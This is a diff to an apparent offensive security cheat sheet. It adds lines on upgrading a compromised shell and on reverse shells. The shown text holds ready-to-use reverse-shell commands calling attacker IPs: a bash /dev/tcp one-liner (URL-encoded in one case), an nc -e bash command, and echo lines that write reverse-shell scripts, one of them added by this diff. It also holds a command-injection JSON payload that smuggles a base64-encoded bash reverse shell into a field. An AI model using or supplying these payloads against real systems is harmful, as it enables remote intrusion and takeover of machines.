@@ -104,10 +104,12 @@ export TERM=xterm
 # Press -> Ctrl + Z
 stty raw -echo; fg
 --------------------------------
-#if there is no python installed
+# if there is no python installed
 /bin/bash -i
+# or
+script /dev/null -c bash
 --------------------------------
-#if you are on a meterpreter
+# if you are on a meterpreter
 SHELL=/bin/bash script -q /dev/null
 ```
 
@@ -159,6 +161,7 @@ bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
 nc IP_ATTCK PORT -e /bin/bash
 
 echo "#!/bin/bash bash -i >& /dev/tcp/10.14.69.1/999 0>&1" > backup.sh
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/666 0>&1' > shell.sh
 
 # Encoded on base64
 {"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
